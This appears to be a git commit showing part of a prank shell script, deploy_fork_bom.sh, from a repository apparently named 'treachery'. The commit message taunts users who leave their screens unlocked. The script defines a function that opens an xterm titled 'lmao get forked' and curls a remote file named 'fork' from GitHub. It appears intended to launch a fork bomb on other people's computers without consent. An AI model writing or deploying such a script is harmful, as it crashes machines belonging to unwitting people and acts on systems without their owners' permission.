772a047e63910b5f2f8682f624175c60d188b2bf
Mats De Beer <mde-beer@f1r4s17.codam.nl>
2024-11-19 18:50:19 +0100

    you like leaving your screen unlocked, dont you?

--- assorted/forked_bom/deploy_fork_bom.sh
+++ assorted/forked_bom/deploy_fork_bom.sh
@@ -1,7 +1,6 @@
 #!/bin/sh
 
 location='https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/forked_bom/deploy_fork_bom.sh'
-
 bom(){
 	xterm -hold -title 'lmao get forked' -mesg -geometry 126x71 -e curl https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/forked_bom/fork
 }
